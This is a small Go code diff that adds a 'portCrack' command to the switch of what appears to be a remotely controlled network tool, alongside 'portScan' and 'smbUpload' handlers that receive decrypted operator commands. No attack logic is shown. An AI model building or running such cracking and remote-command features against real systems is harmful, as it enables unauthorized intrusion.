@@ -62,6 +62,9 @@ func Start() {
 			case "portScan":
 				go portScanCmd(sendUserId, decData)
 				break
+			case "portCrack":
+				go portCrackCmd(sendUserId, decData)
+				break
 			case "smbUpload":
 				go smbUploadCmd(sendUserId, decData)
 				break
